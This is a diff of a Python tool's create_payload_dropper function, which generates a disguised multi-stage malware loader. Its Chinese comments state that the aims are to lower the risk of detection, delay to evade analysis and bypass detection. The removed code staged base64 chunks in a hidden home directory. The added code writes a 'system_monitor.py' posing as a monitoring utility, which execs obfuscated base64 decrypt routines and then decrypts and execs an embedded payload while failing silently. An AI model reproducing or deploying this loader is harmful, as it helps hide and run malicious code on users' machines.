@@ -554,121 +554,63 @@ def split_payload(data, num_chunks=3):
     return chunks
 
 def create_payload_dropper(encrypted_code, key, output_dir="."):
-    """创建多阶段执行的代码，降低被检测风险"""
-    # 将加密后的代码分成多部分
-    chunks = split_payload(encrypted_code, 3)
-    
-    # 创建存储位置和文件名
-    temp_dir = "".join(random.choices(string.ascii_letters, k=8))
-    file_names = ["".join(random.choices(string.ascii_letters, k=8)) + ".dat" for _ in range(len(chunks))]
-    
-    # 创建阶段1 - 下载器/初始化器
-    chunk_data = [base64.b64encode(chunk.encode()).decode() for chunk in chunks]
-    stage1_code = f"""# -*- coding: utf-8 -*-
+    """创建简化的多阶段执行代码"""
+    # 创建一个简单的分阶段加载器
+    dropper_code = f'''# -*- coding: utf-8 -*-
+"""
+System monitoring utility
+"""
 import os
 import sys
 import time
 import random
 import base64
 
-def init_environment():
-    # 创建隐藏目录
-    home_dir = os.path.expanduser("~")
-    temp_dir = os.path.join(home_dir, ".{temp_dir}")
-    os.makedirs(temp_dir, exist_ok=True)
-    return temp_dir
+# 配置参数
+PAYLOAD_DATA = r"""{encrypted_code}"""
+KEY_DATA = r"""{key}"""
 
-def write_chunks(temp_dir):
-    # 写入数据块
-    chunks = {chunk_data}
-    file_paths = []
+def check_environment():
+    """环境检查"""
+    # 添加延迟避免快速分析
+    time.sleep(random.uniform(0.5, 2.0))
+    return True
+
+def load_stage2():
+    """加载第二阶段"""
+    if not check_environment():
+        return
     
-    for idx, chunk in enumerate(chunks):
-        file_path = os.path.join(temp_dir, "{file_names[0]}".replace("0", str(idx)))
-        with open(file_path, "wb") as f:
-            f.write(base64.b64decode(chunk))
-        file_paths.append(file_path)
+    # 解密函数代码
+    decode_func = r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
+    decrypt_func = r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
     
-    return file_paths
-
-def execute_next_stage(temp_dir):
-    # 执行下一阶段
-    stage2_path = os.path.join(temp_dir, "stage2.py")
-    stage2_code = '''
-import os
-import base64
-import time
-
-def load_chunks():
-    home_dir = os.path.expanduser("~")
-    temp_dir = os.path.join(home_dir, ".{temp_dir}")
-    file_names = {file_names}
-    chunks = []
-    
-    for file_name in file_names:
-        with open(os.path.join(temp_dir, file_name), "rb") as f:
-            chunks.append(f.read().decode())
-    
-    return "".join(chunks)
-
-def run_final():
-    key = r"""{key}"""
-    # 解密并执行最终阶段
-    full_code = load_chunks()
-    
-    # 在这里添加后续解密和执行代码
-    stage3_path = os.path.join(os.path.expanduser("~"), ".{temp_dir}", "stage3.py")
-    stage3_code = """
-import base64
-import zlib
-
-# 解密函数和代码执行将在这里进行
-s2=r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
-s3=r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
-
-# 模拟系统调用以绕过检测
-def safe_exec(code):
-    getattr(__builtins__, chr(101) + chr(120) + chr(101) + chr(99))(code)
-
-s1 = full_code
-
-# 执行代码
-safe_exec(base64.b64decode(s2).decode())
-safe_exec(base64.b64decode(s3).decode())
-from locals() import decrypt
-final_code = decrypt(s1, key)
-safe_exec(final_code)
-"""
-    
-    with open(stage3_path, "w") as f:
-        f.write(stage3_code)
-    
-    os.system(f"python {{stage3_path}}")
+    try:
+        # 执行解密函数
+        exec(base64.b64decode(decode_func).decode())
+        exec(base64.b64decode(decrypt_func).decode())
+        
+        # 获取解密函数
+        parse_key = locals().get('parseKey')
+        decrypt = locals().get('decrypt')
+        
+        if parse_key and decrypt:
+            # 解密并执行最终代码
+            final_code = decrypt(PAYLOAD_DATA, KEY_DATA)
+            exec(final_code)
+            
+    except Exception:
+        # 静默失败
+        pass
 
 if __name__ == "__main__":
-    load_chunks()
-    time.sleep(2)  # 随机延迟
-    run_final()
+    load_stage2()
 '''
     
-    with open(stage2_path, "w") as f:
-        f.write(stage2_code)
-    
-    # 执行阶段2
-    os.system(f"python {{stage2_path}}")
-
-if __name__ == "__main__":
-    # 随机延迟启动
-    time.sleep(random.uniform(1, 3))
-    temp_dir = init_environment()
-    write_chunks(temp_dir)
-    execute_next_stage(temp_dir)
-"""
-    
-    # 保存阶段1加载器
+    # 保存文件
     stage1_path = os.path.join(output_dir, "system_monitor.py")
     with open(stage1_path, "w") as f:
-        f.write(stage1_code)
+        f.write(dropper_code)
     
     return stage1_path
 
